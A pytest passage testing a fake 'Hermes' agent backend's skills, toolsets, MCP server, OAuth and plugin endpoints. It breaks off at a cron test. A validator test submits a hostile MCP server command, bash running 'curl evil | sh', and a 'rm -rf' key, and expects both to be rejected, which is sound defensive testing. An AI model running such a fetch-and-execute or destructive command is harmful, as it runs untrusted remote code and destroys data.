"""The fake Hermes behind the M4 screens: Capabilities (skills, toolsets, MCP servers + OAuth + catalog, plugins),
Cron, the Command Center (status, logs, analytics, maintenance actions) and Artifacts, checked against the Hermes
shapes and the pinned gateway contract."""

from __future__ import annotations

import asyncio
import base64
import io
import zipfile
from typing import Any

import httpx
import pytest

from fakeclient import CONTRACT_PATH, Contract, Gateway, RpcFailure, serving, signed_in
from fake_hermes import (ARTIFACT_CSV, ARTIFACT_IMAGE, ARTIFACT_LINK_HOST, ARTIFACT_PDF, CRON_FIRE_TOKEN,
                         MCP_CATALOG, OFFICIAL_SKILLS, TERMINAL_BACKENDS)

CONTRACT = Contract(CONTRACT_PATH) if CONTRACT_PATH else None
SKILL = "---\nname: {name}\ndescription: {description}\n---\n\n# Steps\n\n1. Do the thing.\n"


def contract_problems(*gateways: Gateway) -> list[str]:
    return [p for g in gateways for p in CONTRACT.check_gateway(g)] if CONTRACT else []


async def failure(gateway: Gateway, method: str, params: dict) -> RpcFailure:
    with pytest.raises(RpcFailure) as caught:
        await gateway.call(method, params)
    return caught.value


async def finish(http: httpx.AsyncClient, name: str, polls: int = 10) -> list[dict[str, Any]]:
    """Poll an action until it stops running; every status seen, the last one finished."""
    seen = []
    for _ in range(polls):
        seen.append((await http.get(f"/api/actions/{name}/status")).json())
        if not seen[-1]["running"]:
            break
    return seen


def test_skills_list_toggle_edit_create_and_hub_install_per_profile():
    async def scenario():
        async with serving(seed="demo", action_seconds=0) as (fake, base):
            async with signed_in(base) as http:
                listed = (await http.get("/api/skills")).json()
                research = (await http.get("/api/skills", params={"profile": "research"})).json()
                missing_profile = await http.get("/api/skills", params={"profile": "nobody"})
                off = (await http.put("/api/skills/toggle", json={"name": "release-notes", "enabled": False})).json()
                on = (await http.put("/api/skills/toggle", json={"name": "deploy-checklist", "enabled": True,
                                                                 "profile": "default"})).json()
                after = {s["name"]: s["enabled"] for s in (await http.get("/api/skills")).json()}
                bad_toggle = await http.put("/api/skills/toggle", json={"name": "x"})
                content = (await http.get("/api/skills/content", params={"name": "release-notes"})).json()
                no_content = await http.get("/api/skills/content", params={"name": "ghost"})
                rewritten = SKILL.format(name="release-notes", description="Release notes, grouped by area")
                edited = (await http.put("/api/skills/content", json={"name": "release-notes",
                                                                      "content": rewritten})).json()
                bad_edit = await http.put("/api/skills/content", json={"name": "release-notes", "content": "# no"})
                edit_missing = await http.put("/api/skills/content", json={"name": "ghost", "content": rewritten})
                created = (await http.post("/api/skills", params={"profile": "research"}, json={
                    "name": "lit-review", "category": "research",
                    "content": SKILL.format(name="lit-review", description="A literature review")})).json()
                refused = {label: (await http.post("/api/skills", json=body)).json()["detail"] for label, body in {
                    "name": {"name": "Bad Name", "content": SKILL.format(name="x", description="y")},
                    "category": {"name": "ok", "category": "a/b", "content": SKILL.format(name="x", description="y")},
                    "frontmatter": {"name": "ok", "content": "no frontmatter"},
                    "description": {"name": "ok", "content": "---\nname: ok\n---\n\nbody\n"},
                    "exists": {"name": "arxiv", "content": SKILL.format(name="arxiv", description="dup")},
                }.items()}
                official = (await http.get("/api/skills/hub/official")).json()["skills"]
                preview = (await http.get("/api/skills/hub/preview",
                                          params={"identifier": "official/smart-home/home-assistant"})).json()
                install = (await http.post("/api/skills/hub/install",
                                           json={"identifier": "official/smart-home/home-assistant"})).json()
                polls = await finish(http, install["name"])
                installed = {s["name"]: s for s in (await http.get("/api/skills")).json()}
                bad_install = (await http.post("/api/skills/hub/install", json={"identifier": "official/x/y"})).json()
                bad_polls = await finish(http, bad_install["name"])
                uninstall = (await http.post("/api/skills/hub/uninstall", json={"name": "home-assistant"})).json()
                await finish(http, uninstall["name"])
                gone = {s["name"] for s in (await http.get("/api/skills")).json()}
            async with serving() as (fake, base):
                async with signed_in(base) as http:
                    empty = (await http.get("/api/skills")).json()
        return (listed, research, missing_profile, off, on, after, bad_toggle, content, no_content, edited, bad_edit,
                edit_missing, created, refused, official, preview, install, polls, installed, bad_polls, gone, empty)

    (listed, research, missing_profile, off, on, after, bad_toggle, content, no_content, edited, bad_edit,
     edit_missing, created, refused, official, preview, install, polls, installed, bad_polls, gone,
     empty) = asyncio.run(scenario())
    by_name = {s["name"]: s for s in listed}
    assert set(by_name["release-notes"]) == {"name", "description", "category", "enabled", "usage", "provenance"}
    assert by_name["release-notes"] == {"name": "release-notes", "category": "writing", "enabled": True, "usage": 7,
                                        "provenance": "agent",
                                        "description": "Draft release notes from the commits since the last tag."}
    assert not by_name["deploy-checklist"]["enabled"], "a seeded disabled skill"
    assert {s["provenance"] for s in listed} == {"bundled", "hub", "agent", "external"}
    assert [s["category"] for s in listed] == sorted(s["category"] for s in listed)
    assert {s["name"] for s in research} == {"arxiv", "paper-summary", "citation-check"}
    assert missing_profile.json() == {"detail": "Profile 'nobody' does not exist."}
    assert off == {"ok": True, "name": "release-notes", "enabled": False} and on["enabled"]
    assert after["release-notes"] is False and after["deploy-checklist"] is True
    assert bad_toggle.status_code == 422 and bad_toggle.json()["detail"][0]["loc"] == ["body", "enabled"]
    assert content["content"].startswith("---\nname: release-notes\n") and content["path"].endswith(
        "/skills/writing/release-notes/SKILL.md")
    assert no_content.status_code == 404 and no_content.json() == {"detail": "Skill 'ghost' not found."}
    assert edited["success"] and edited["_change"] == {"description": "Release notes, grouped by area"}
    assert bad_edit.status_code == 400 and "frontmatter" in bad_edit.json()["detail"]
    assert edit_missing.status_code == 404
    assert created["success"] and created["path"] == "research/lit-review" and created["category"] == "research"
    assert refused["name"].startswith("Invalid skill name 'Bad Name'")
    assert refused["category"].startswith("Invalid category 'a/b'")
    assert refused["frontmatter"].startswith("SKILL.md must start with YAML frontmatter")
    assert refused["description"] == "Frontmatter must include 'description' field."
    assert refused["exists"].startswith("A skill named 'arxiv' already exists at ")
    assert [s["name"] for s in official] == [row[0] for row in OFFICIAL_SKILLS]
    assert {s["name"]: s["installed"] for s in official}["weekly-review-planning"] is True
    assert preview["skill_md"].startswith("---\nname: home-assistant") and "SKILL.md" in preview["files"]
    assert install["ok"] and install["name"].startswith("skills-install-official-smart-home-home-assistant-")
    assert [p["running"] for p in polls] == [True, True, False] and polls[-1]["exit_code"] == 0
    assert polls[0]["lines"][1].startswith(f"=== {install['name']} started ") and len(polls[0]["lines"]) < len(
        polls[-1]["lines"]), "the log grows poll by poll"
    assert installed["home-assistant"]["provenance"] == "hub" and installed["home-assistant"]["enabled"]
    assert bad_polls[-1]["exit_code"] == 1 and "Error: skill not found" in bad_polls[-1]["lines"][-1]
    assert "home-assistant" not in gone
    assert empty == [], "--seed minimal: the empty state"


def test_toolsets_providers_models_env_and_terminal_backends(capsys):
    async def scenario():
        async with serving(seed="demo", action_seconds=0) as (fake, base):
            async with signed_in(base) as http:
                toolsets = (await http.get("/api/tools/toolsets")).json()
                research = (await http.get("/api/tools/toolsets", params={"profile": "research"})).json()
                stt_off = (await http.put("/api/tools/toolsets/stt", json={"enabled": False})).json()
                stt_config = (await http.get("/api/config")).json()["stt"]["enabled"]
                cu_on = (await http.put("/api/tools/toolsets/computer_use", json={"enabled": True})).json()
                setup_polls = await finish(http, "tools-post-setup")
                unknown = await http.put("/api/tools/toolsets/nope", json={"enabled": True})
                web = (await http.get("/api/tools/toolsets/web/config")).json()
                todo = (await http.get("/api/tools/toolsets/todo/config")).json()
                image = (await http.get("/api/tools/toolsets/image_gen/config")).json()
                models = (await http.get("/api/tools/toolsets/image_gen/models")).json()
                openai = (await http.get("/api/tools/toolsets/image_gen/models", params={"provider": "OpenAI"})).json()
                no_models = (await http.get("/api/tools/toolsets/web/models")).json()
                picked = (await http.put("/api/tools/toolsets/image_gen/model",
                                         json={"model": "fal-ai/recraft-v3"})).json()
                models_after = (await http.get("/api/tools/toolsets/image_gen/models")).json()
                bad_model = await http.put("/api/tools/toolsets/image_gen/model", json={"model": "dall-e-2"})
                capability = (await http.put("/api/tools/toolsets/web/provider",
                                             json={"provider": "Tavily", "capability": "extract"})).json()
                search_only = await http.put("/api/tools/toolsets/web/provider",
                                             json={"provider": "DuckDuckGo", "capability": "extract"})
                managed = (await http.put("/api/tools/toolsets/web/provider",
                                          json={"provider": "Nous Subscription"})).json()
                wrong_toolset = await http.put("/api/tools/toolsets/tts/provider",
                                               json={"provider": "OpenAI TTS", "capability": "search"})
                env = (await http.put("/api/tools/toolsets/web/env", json={"env": {
                    "TAVILY_API_KEY": "tvly-secret-value-123", "FIRECRAWL_API_URL": ""}})).json()
                env_unknown = await http.put("/api/tools/toolsets/web/env", json={"env": {"PATH": "/tmp"}})
                web_after = (await http.get("/api/tools/toolsets/web/config")).json()
                masked = (await http.get("/api/env")).json()
                post_setup = (await http.post("/api/tools/toolsets/x_search/post-setup",
                                              json={"key": "xai_grok"})).json()
                bad_key = await http.post("/api/tools/toolsets/x_search/post-setup", json={"key": "rm -rf"})
                backends = (await http.get("/api/tools/terminal/backends")).json()
                chosen = (await http.put("/api/tools/terminal/backend", json={"backend": "Docker"})).json()
                config_backend = (await http.get("/api/config")).json()["terminal"]["backend"]
                backends_after = (await http.get("/api/tools/terminal/backends")).json()["active"]
                bad_backend = await http.put("/api/tools/terminal/backend", json={"backend": "kubernetes"})
        return (toolsets, research, stt_off, stt_config, cu_on, setup_polls, unknown, web, todo, image, models,
                openai, no_models, picked, models_after, bad_model, capability, search_only, managed, wrong_toolset,
                env, env_unknown, web_after, masked, post_setup, bad_key, backends, chosen, config_backend,
                backends_after, bad_backend)

    (toolsets, research, stt_off, stt_config, cu_on, setup_polls, unknown, web, todo, image, models, openai,
     no_models, picked, models_after, bad_model, capability, search_only, managed, wrong_toolset, env, env_unknown,
     web_after, masked, post_setup, bad_key, backends, chosen, config_backend, backends_after,
     bad_backend) = asyncio.run(scenario())
    rows = {t["name"]: t for t in toolsets}
    assert list(rows)[:3] == ["web", "browser", "terminal"]
    assert set(rows["web"]) == {"name", "label", "description", "platform", "platform_label", "enabled", "available",
                                "configured", "tools"}
    assert rows["web"]["label"] == "Web Search & Scraping" and rows["web"]["tools"] == ["web_extract", "web_search"]
    assert {"tts", "stt"} <= set(rows), "voice toolsets are served; the app strips them"
    assert rows["discord"]["platform"] == "discord" and not rows["discord"]["enabled"], "default-off and restricted"
    assert rows["kanban"]["enabled"] and "linear_sync" in rows, "an enabled plugin adds its toolset"
    assert rows["image_gen"]["configured"] is False, "FAL_KEY is missing and Nous is not signed in"
    assert "linear_sync" not in {t["name"] for t in research}
    assert stt_off == {"ok": True, "name": "stt", "platform": "cli", "enabled": False, "post_setup_started": None}
    assert stt_config is False, "stt is config-only: its switch is stt.enabled"
    assert cu_on["post_setup_started"] == "cua_driver" and setup_polls[-1]["exit_code"] == 0
    assert unknown.status_code == 400 and unknown.json() == {"detail": "Unknown toolset: nope"}
    providers = {p["name"]: p for p in web["providers"]}
    assert web["has_category"] and web["active_provider"] == "DuckDuckGo"
    assert providers["DuckDuckGo"]["status"] == "ready" and providers["DuckDuckGo"]["capabilities"] == ["search"]
    assert providers["Nous Subscription"]["status"] == "needs_auth"
    assert providers["Tavily"]["status"] == "needs_keys" and providers["Tavily"]["env_vars"][0] == {
        "key": "TAVILY_API_KEY", "prompt": "Tavily API key", "url": "https://app.tavily.com/", "default": None,
        "is_set": False}
    assert web["active_search_backend"] == "ddgs" and web["active_extract_backend"] is None
    assert todo == {"name": "todo", "has_category": False, "providers": [], "active_provider": None}
    assert {p["name"]: p["status"] for p in image["providers"]}["FAL"] == "needs_keys"
    assert models["has_models"] and models["plugin"] == "fal" and models["current"] == models["default"] == \
        "fal-ai/flux-2-pro"
    assert set(models["models"][0]) == {"id", "display", "speed", "strengths", "price"}
    assert openai["plugin"] == "openai" and openai["current"] == "gpt-image-1"
    assert no_models == {"name": "web", "has_models": False, "models": [], "current": None, "default": None}
    assert picked == {"ok": True, "name": "image_gen", "model": "fal-ai/recraft-v3", "plugin": "fal"}
    assert models_after["current"] == "fal-ai/recraft-v3"
    assert bad_model.json() == {"detail": "Unknown model 'dall-e-2' for backend 'fal'"}
    assert capability == {"ok": True, "name": "web", "provider": "Tavily", "capability": "extract"}
    assert search_only.json() == {"detail": "DuckDuckGo does not support extract"}
    assert managed == {"ok": True, "name": "web", "provider": "Nous Subscription", "needs_nous_auth": True,
                       "feature": "web"}
    assert wrong_toolset.json() == {"detail": "capability selection is only supported for the web toolset"}
    assert env == {"ok": True, "name": "web", "saved": ["TAVILY_API_KEY"], "skipped": ["FIRECRAWL_API_URL"],
                   "is_set": {"FIRECRAWL_API_URL": False, "TAVILY_API_KEY": True}}
    assert env_unknown.json() == {"detail": "Unknown env var(s) for toolset web: PATH"}
    assert {p["name"]: p["status"] for p in web_after["providers"]}["Tavily"] == "ready"
    assert masked["TAVILY_API_KEY"]["is_set"] and "tvly-secret-value-123" not in str(masked)
    assert post_setup["name"] == "tools-post-setup" and post_setup["key"] == "xai_grok" and post_setup["pid"] > 0
    assert bad_key.json() == {"detail": "Unknown post-setup key: rm -rf"}
    assert [b["name"] for b in backends["backends"]] == [row[0] for row in TERMINAL_BACKENDS]
    assert backends["active"] == "local" and backends["backends"][0] == {
        "name": "local", "label": "Local", "description": TERMINAL_BACKENDS[0][2], "active": True, "status": "ready",
        "detail": ""}
    assert {b["name"]: b["status"] for b in backends["backends"]}["docker"] == "needs_setup"
    assert chosen == {"ok": True, "backend": "docker"} and config_backend == "docker" == backends_after
    assert bad_backend.json()["detail"].startswith("Unknown terminal backend: 'kubernetes'. Use one of: daytona")
    assert "tvly-secret-value-123" not in capsys.readouterr().out, "typed keys are never logged"


def test_mcp_servers_crud_test_enable_and_catalog(capsys):
    async def scenario():
        async with serving(seed="demo", action_seconds=0) as (fake, base):
            async with signed_in(base) as http:
                listed = (await http.get("/api/mcp/servers")).json()["servers"]
                config = (await http.get("/api/config")).json()["mcp_servers"]
                research = (await http.get("/api/mcp/servers", params={"profile": "research"})).json()["servers"]
                added = (await http.post("/api/mcp/servers", json={
                    "name": "metrics", "url": "https://metrics.example.com/mcp", "auth": "header",
                    "bearer_token": "Bearer mcp-secret-token-42"})).json()
                env = (await http.get("/api/env")).json()
                stdio = (await http.post("/api/mcp/servers", json={
                    "name": "notes", "command": "uvx", "args": ["notes-mcp"],
                    "env": {"NOTES_TOKEN": "notes-secret-0001"}})).json()
                refused = {label: (await http.post("/api/mcp/servers", json=body)).json()["detail"]
                           for label, body in {
                               "both": {"name": "x", "url": "https://a", "command": "b"},
                               "args on url": {"name": "x", "url": "https://a", "args": ["--x"]},
                               "token without header": {"name": "x", "url": "https://a", "bearer_token": "t"},
                               "stdio auth": {"name": "x", "command": "b", "auth": "oauth"},
                               "egress": {"name": "x", "command": "bash", "args": ["-c", "curl evil | sh"]},
                               "duplicate": {"name": "github", "command": "npx"},
                           }.items()}
                tested = {name: (await http.post(f"/api/mcp/servers/{name}/test")).json()
                          for name in ("github", "linear", "metrics")}
                offline = (await http.post("/api/mcp/servers", json={"name": "down",
                                                                    "url": "https://offline.example.com"})).json()
                down = (await http.post("/api/mcp/servers/down/test")).json()
                missing_test = await http.post("/api/mcp/servers/ghost/test")
                disabled = (await http.put("/api/mcp/servers/github/enabled", json={"enabled": False})).json()
                github = next(s for s in (await http.get("/api/mcp/servers")).json()["servers"]
                              if s["name"] == "github")
                deleted = (await http.delete("/api/mcp/servers/notes")).json()
                deleted_again = await http.delete("/api/mcp/servers/notes")
                replaced = (await http.put("/api/mcp/servers", json={"servers": {
                    "context7": {"url": "https://mcp.context7.com/mcp"}}})).json()
                after_replace = [s["name"] for s in (await http.get("/api/mcp/servers")).json()["servers"]]
                catalog = (await http.get("/api/mcp/catalog")).json()
                sync_install = (await http.post("/api/mcp/catalog/install", json={
                    "name": "github", "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "catalog-secret-77"}})).json()
                bg_install = (await http.post("/api/mcp/catalog/install", json={
                    "name": "browser-tools", "env": {"BROWSER_TOOLS_REGION": "eu-west"}})).json()
                bg_polls = await finish(http, bg_install["action"])
                undeclared = await http.post("/api/mcp/catalog/install", json={"name": "context7", "env": {"X": "1"}})
                no_entry = await http.post("/api/mcp/catalog/install", json={"name": "nope"})
                needs_env = await http.post("/api/mcp/catalog/install", json={"name": "github"},
                                            params={"profile": "research"})
                installed = {s["name"]: s for s in (await http.get("/api/mcp/servers")).json()["servers"]}
                catalog_after = {e["name"]: e for e in (await http.get("/api/mcp/catalog")).json()["entries"]}
                env_after = (await http.get("/api/env")).json()
        return (listed, config, research, added, env, stdio, refused, tested, offline, down, missing_test, disabled,
                github, deleted, deleted_again, replaced, after_replace, catalog, sync_install, bg_install, bg_polls,
                undeclared, no_entry, needs_env, installed, catalog_after, env_after)

    (listed, config, research, added, env, stdio, refused, tested, offline, down, missing_test, disabled, github,
     deleted, deleted_again, replaced, after_replace, catalog, sync_install, bg_install, bg_polls, undeclared,
     no_entry, needs_env, installed, catalog_after, env_after) = asyncio.run(scenario())
    by_name = {s["name"]: s for s in listed}
    assert list(by_name) == sorted(by_name) and set(by_name) == {"filesystem", "github", "internal-docs", "linear"}
    assert set(by_name["github"]) == {"name", "transport", "url", "command", "args", "env", "auth", "enabled",
                                      "tools", "source", "plugin"}
    assert by_name["github"]["env"] == {"GITHUB_PERSONAL_ACCESS_TOKEN": "fake...0000"}, "env values are masked"
    assert by_name["linear"]["transport"] == "http" and by_name["linear"]["auth"] == "oauth"
    assert by_name["internal-docs"]["auth"] == "header" and by_name["internal-docs"]["tools"] == {
        "include": ["search_docs", "get_page"]}
    assert by_name["filesystem"]["enabled"] is False and by_name["github"]["source"] == "config"
    assert set(config) == set(by_name), "mcp_servers lives in config.yaml as in Hermes"
    assert {s["name"] for s in research} == {"context7", "zotero"}
    assert added["auth"] == "header" and added["url"] == "https://metrics.example.com/mcp"
    assert env["MCP_METRICS_API_KEY"]["is_set"], "the bearer token goes to .env"
    assert stdio["transport"] == "stdio" and stdio["env"] == {"NOTES_TOKEN": "note...0001"}
    assert refused == {
        "both": "Provide exactly one of URL (HTTP/SSE) or command (stdio)",
        "args on url": "Arguments are only supported for stdio MCP servers",
        "token without header": "Bearer token requires header authentication",
        "stdio auth": "HTTP authentication is not supported for stdio MCP servers",
        "egress": "Server 'x' rejected: MCP server 'x' uses shell interpreter 'bash' with network egress in args",
        "duplicate": "Server 'github' already exists"}
    assert tested["github"]["ok"] and tested["github"]["tools"][0] == {
        "name": "create_issue", "description": "Create a new issue in a GitHub repository", "schema_chars": 812}
    assert tested["github"]["prompts"] == 2 and tested["github"]["resources"] == 0
    assert tested["linear"] == {"ok": False, "error": "OAuth authentication required — no token found.", "tools": []}
    assert tested["metrics"]["ok"] and [t["name"] for t in tested["metrics"]["tools"]] == ["echo", "ping"]
    assert offline["name"] == "down" and down["ok"] is False and "connection refused" in down["error"]
    assert missing_test.status_code == 404 and missing_test.json() == {"detail": "Server 'ghost' not found"}
    assert disabled == {"ok": True, "name": "github", "enabled": False} and github["enabled"] is False
    assert deleted == {"ok": True} and deleted_again.status_code == 404
    assert replaced == {"ok": True} and after_replace == ["context7"], "PUT replaces the whole map"
    entries = {e["name"]: e for e in catalog["entries"]}
    assert [e["name"] for e in catalog["entries"]] == [e["name"] for e in MCP_CATALOG]
    assert catalog["diagnostics"] == [] and not any(k.startswith("_") for e in catalog["entries"] for k in e)
    assert entries["github"]["required_env"] == [{"name": "GITHUB_PERSONAL_ACCESS_TOKEN",
                                                  "prompt": "GitHub personal access token (repo scope)",
                                                  "required": True}]
    assert entries["browser-tools"]["needs_install"] and entries["browser-tools"]["bootstrap"] == ["npm ci",
                                                                                                   "npm run build"]
    assert entries["context7"]["installed"] and entries["context7"]["enabled"], "the map was replaced by context7"
    assert not entries["linear"]["installed"] and entries["linear"]["auth_type"] == "oauth"
    assert entries["linear"]["suggest"]["hosts"] == ["linear.app"]
    assert sync_install == {"ok": True, "name": "github", "background": False}
    assert bg_install["background"] and bg_install["action"].startswith("mcp-install-browser-tools-")
    assert bg_polls[-1]["exit_code"] == 0 and bg_polls[-1]["lines"][-1] == "Installed MCP server 'browser-tools'."
    assert undeclared.json() == {"detail": "Catalog entry 'context7' does not declare environment variable(s): X"}
    assert no_entry.status_code == 404 and needs_env.status_code == 400
    assert installed["github"]["env"] == {"GITHUB_PERSONAL_ACCESS_TOKEN": "${GI...KEN}"}, \
        "a secret stays in .env and the config only references it"
    assert installed["browser-tools"]["env"] == {"BROWSER_TOOLS_REGION": "***"}, "every env value is masked"
    assert catalog_after["github"]["installed"] and catalog_after["github"]["enabled"]
    assert env_after["GITHUB_PERSONAL_ACCESS_TOKEN"]["is_set"]
    out = capsys.readouterr().out
    assert not any(secret in out for secret in ("mcp-secret-token-42", "notes-secret-0001", "catalog-secret-77"))


def test_mcp_oauth_flow_completes_by_callback_or_by_itself_and_can_be_cancelled():
    async def scenario():
        async with serving(seed="demo", mcp_oauth_approve_after=0) as (fake, base):
            async with signed_in(base) as http:
                started = (await http.post("/api/mcp/servers/linear/auth")).json()
                pending = (await http.get(f"/api/mcp/oauth/flows/{started['flow_id']}")).json()
                twice = await http.post("/api/mcp/servers/linear/auth")
                page = await http.get(started["authorization_url"].replace(f"http://{base}", ""))
                state = dict(httpx.URL(started["authorization_url"]).params)["state"]
                async with httpx.AsyncClient(base_url=f"http://{base}") as browser:
                    wrong = await browser.get("/api/mcp/oauth/callback/linear", params={"code": "c", "state": "x"})
                    callback = await browser.get("/api/mcp/oauth/callback/linear", params={"code": "c",
                                                                                           "state": state})
                approved = (await http.get(f"/api/mcp/oauth/flows/{started['flow_id']}")).json()
                tested = (await http.post("/api/mcp/servers/linear/test")).json()
                stdio = await http.post("/api/mcp/servers/github/auth")
                header = await http.post("/api/mcp/servers/internal-docs/auth")
                missing = await http.post("/api/mcp/servers/ghost/auth")
                cancel_me = (await http.post("/api/mcp/servers/linear/auth")).json()
                cancelled = (await http.delete(f"/api/mcp/oauth/flows/{cancel_me['flow_id']}")).json()
                cancelled_flow = (await http.get(f"/api/mcp/oauth/flows/{cancel_me['flow_id']}")).json()
                expired = (await http.delete("/api/mcp/oauth/flows/nope")).json()
                lost = await http.get("/api/mcp/oauth/flows/nope")
                denied = (await http.post("/api/mcp/servers/linear/auth")).json()
                denied_state = dict(httpx.URL(denied["authorization_url"]).params)["state"]
                async with httpx.AsyncClient(base_url=f"http://{base}") as browser:
                    await browser.get("/api/mcp/oauth/callback/linear", params={"error": "access_denied",
                                                                                "state": denied_state})
                denied_flow = (await http.get(f"/api/mcp/oauth/flows/{denied['flow_id']}")).json()
                await http.delete("/api/mcp/servers/linear")
                await http.post("/api/mcp/servers", json={"name": "linear", "url": "https://mcp.linear.app/mcp",
                                                          "auth": "oauth"})
                fresh = (await http.post("/api/mcp/servers/linear/test")).json()
                debug_flow = (await http.post("/api/mcp/servers/linear/auth")).json()
                debugged = (await http.post(f"/api/mcp/oauth/flows/{debug_flow['flow_id']}/debug",
                                            json={"outcome": "approve"})).json()
                bad_outcome = await http.post(f"/api/mcp/oauth/flows/{debug_flow['flow_id']}/debug",
                                              json={"outcome": "maybe"})
        async with serving(seed="demo", mcp_oauth_approve_after=0.1) as (fake, base):
            async with signed_in(base) as http:
                flow = (await http.post("/api/mcp/servers/linear/auth")).json()
                await asyncio.sleep(0.3)
                by_itself = (await http.get(f"/api/mcp/oauth/flows/{flow['flow_id']}")).json()
        return (started, pending, twice, page, wrong, callback, approved, tested, stdio, header, missing, cancelled,
                cancelled_flow, expired, lost, denied_flow, fresh, debugged, bad_outcome, by_itself)

    (started, pending, twice, page, wrong, callback, approved, tested, stdio, header, missing, cancelled,
     cancelled_flow, expired, lost, denied_flow, fresh, debugged, bad_outcome, by_itself) = asyncio.run(scenario())
    assert set(started) == {"flow_id", "server_name", "status", "authorization_url", "error"}
    assert started["status"] == "authorization_required" and started["server_name"] == "linear"
    assert "/fake-oauth/authorize?" in started["authorization_url"]
    assert pending["tools"] is None and pending["status"] == "authorization_required"
    assert twice.status_code == 409 and twice.json() == {"detail": "MCP OAuth for 'linear' is already in progress"}
    assert page.status_code == 200 and "Approve" in page.text
    assert wrong.status_code == 404 and callback.status_code == 200 and "Authorization received" in callback.text
    assert approved["status"] == "approved" and approved["tools"][0] == {"name": "create_issue",
                                                                         "description": "Create a Linear issue"}
    assert tested["ok"] and len(tested["tools"]) == 3, "the token makes the probe pass"
    assert stdio.json() == {"detail": "stdio servers authenticate via env keys, not OAuth"}
    assert header.json() == {"detail": "This server uses header/API-key auth, not OAuth"}
    assert missing.status_code == 404
    assert cancelled == {"ok": True, "status": "error"} and cancelled_flow["error"] == "Cancelled by user"
    assert expired == {"ok": True, "status": "expired"} and lost.json() == {"detail": "OAuth flow not found or expired"}
    assert denied_flow["status"] == "error" and "access_denied" in denied_flow["error"]
    assert fresh["ok"] is False, "removing a server drops its token"
    assert debugged["status"] == "approved" and debugged["tools"], "the debug trigger settles a flow"
    assert bad_outcome.status_code == 400
    assert by_itself["status"] == "approved", "--mcp-oauth-approve-after approves without the callback"


def test_plugins_manage_lists_toggles_installs_updates_and_removes():
    async def scenario():
        async with serving(seed="demo") as (fake, base):
            async with signed_in(base) as http:
                gateway = await Gateway.connect(base, http)
                listed = await gateway.call("plugins.manage", {"action": "list"})
                research = await gateway.call("plugins.manage", {"action": "list", "profile": "research"})
                legacy = await gateway.call("plugins.list", {})
                enabled = await gateway.call("plugins.manage", {"action": "toggle", "key": "weather-briefing",
                                                                "enable": True})
                servers = [s["name"] for s in (await http.get("/api/mcp/servers")).json()["servers"]]
                plugin_server = next(s for s in (await http.get("/api/mcp/servers")).json()["servers"]
                                     if s["name"] == "weather")
                locked = await http.delete("/api/mcp/servers/weather")
                same = await gateway.call("plugins.manage", {"action": "toggle", "name": "weather-briefing",
                                                             "enable": True})
                errors = {label: (await failure(gateway, "plugins.manage", params)).code for label, params in {
                    "toggle nothing": {"action": "toggle"},
                    "toggle unknown": {"action": "toggle", "key": "ghost", "enable": True},
                    "install nothing": {"action": "install"},
                    "clone fails": {"action": "install", "identifier": "example/hermes-plugin-missing"},
                    "already": {"action": "install", "catalog_name": "linear-sync"},
                    "remove bundled": {"action": "remove", "name": "kanban"},
                    "unknown action": {"action": "explode"},
                    "unknown profile": {"action": "list", "profile": "ghost"},
                    "extra key": {"action": "list", "bogus": True},
                }.items()}
                installed = await gateway.call("plugins.manage", {"action": "install",
                                                                  "catalog_name": "notion-digest"})
                git = await gateway.call("plugins.manage", {
                    "action": "install", "identifier": "https://github.com/example/hermes-plugin-todo"})
                consent = await gateway.call("plugins.manage", {"action": "update", "name": "linear-sync"})
                updated = await gateway.call("plugins.manage", {"action": "update", "name": "linear-sync",
                                                                "accept_capabilities": True})
                unchanged = await gateway.call("plugins.manage", {"action": "update", "name": "linear-sync"})
                settings = await gateway.call("plugins.manage", {"action": "settings", "key": "linear-sync",
                                                                 "values": {"team": "OPS", "interval_minutes": 30}})
                secret = await failure(gateway, "plugins.manage", {"action": "settings", "key": "linear-sync",
                                                                   "values": {"api_key": "x"}})
                removed = await gateway.call("plugins.manage", {"action": "remove", "name": "todo"})
                after = await gateway.call("plugins.manage", {"action": "list"})
                await gateway.close()
        return (listed, research, legacy, enabled, servers, plugin_server, locked, same, errors, installed, git,
                consent, updated, unchanged, settings, secret, removed, after, gateway)

    (listed, research, legacy, enabled, servers, plugin_server, locked, same, errors, installed, git, consent,
     updated, unchanged, settings, secret, removed, after, gateway) = asyncio.run(scenario())
    rows = {p["key"]: p for p in listed["plugins"]}
    assert listed["user_count"] == 3 and listed["bundled_count"] == 4
    assert rows["hermes_voice"]["status"] == "enabled" and rows["hermes_voice"]["source"] == "user"
    assert rows["kanban"]["status"] == "not enabled" and rows["image_gen/fal"]["status"] == "enabled"
    linear = rows["linear-sync"]
    assert linear["portable"] and linear["update_available"] and linear["catalog_tier"] == "verified"
    assert linear["servers"] == [{"name": "linear-sync", "state": "connected", "sentence": "Connected — 2 tools"}]
    assert [f["key"] for f in linear["settings_schema"]] == ["team", "interval_minutes", "api_key"]
    assert linear["settings_schema"][2] == {"key": "api_key", "type": "secret", "label": "Linear API key",
                                            "description": "Personal API key", "required": True,
                                            "env": "LINEAR_SYNC_API_KEY", "has_value": False}
    assert research["user_count"] == 0 and research["bundled_count"] == 4
    assert {p["name"] for p in legacy["plugins"]} >= {"hermes_voice", "kanban"}
    assert enabled["ok"] and not enabled["unchanged"] and enabled["gateway_reloaded"]
    assert enabled["plugin"]["status"] == "enabled" and enabled["activation"]["live_now"]["mcp_servers"][0][
        "name"] == "weather"
    assert "weather" in servers and plugin_server["source"] == "plugin" and plugin_server[
        "plugin"] == "weather-briefing"
    assert locked.status_code == 409, "a plugin-provided server can't be edited"
    assert same["unchanged"] and same["activation"] is None
    assert errors == {"toggle nothing": 4019, "toggle unknown": 5026, "install nothing": 4019, "clone fails": 5026,
                      "already": 5026, "remove bundled": 5026, "unknown action": 4017, "unknown profile": 4004,
                      "extra key": 4000}
    assert installed["ok"] and installed["plugin_name"] == "notion-digest" and installed["enabled"]
    assert git["plugin_name"] == "todo"
    assert consent["ok"] is False and consent["consent_required"] and consent["delta"] == {
        "tools": ["linear_delete_issue"]}
    assert updated["ok"] and not updated["unchanged"] and updated["sha"] == "5d6e7f8a9b0c"
    assert unchanged == {"ok": True, "unchanged": True, "name": "linear-sync", "warnings": []}
    assert settings["written"] == ["interval_minutes", "team"] and settings["plugin"]["settings_schema"][0][
        "value"] == "OPS"
    assert secret.code == 4021
    assert removed == {"ok": True, "name": "todo"}
    keys = {p["key"] for p in after["plugins"]}
    assert "todo" not in keys and "notion-digest" in keys
    assert {p["key"]: p for p in after["plugins"]}["linear-sync"]["version"] == "1.3.0"
    assert contract_problems(gateway) == []


def test_cron_jobs_runs_triggers_targets_blueprints_and_fire():
    async def scenario():
